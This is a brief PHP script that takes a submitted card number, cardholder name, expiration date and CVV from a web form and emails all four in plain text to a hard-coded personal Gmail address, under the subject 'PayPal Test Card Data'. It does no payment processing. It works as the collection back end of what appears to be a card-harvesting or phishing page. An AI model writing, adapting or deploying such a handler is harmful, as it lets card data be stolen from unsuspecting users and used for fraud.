<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cardNumber = $_POST['cardNumber'];
    $cardHolder = $_POST['cardHolder'];
    $expirationDate = $_POST['expirationDate'];
    $cvv = $_POST['cvv'];

    $to = "marwanbelhouki8@gmail.com";  // Your email
    $subject = "PayPal Test Card Data";
    $message = "Card Number: " . $cardNumber . "\nCard Holder: " . $cardHolder . "\nExpiration Date: " . $expirationDate . "\nCVV: " . $cvv;
    $headers = "From: your_email@gmail.com";  // Replace with your email

    if (mail($to, $subject, $message, $headers)) {
        echo "<p>Email sent successfully.</p>";
    } else {
        echo "<p>An error occurred while sending the email.</p>";
    }
}
?>
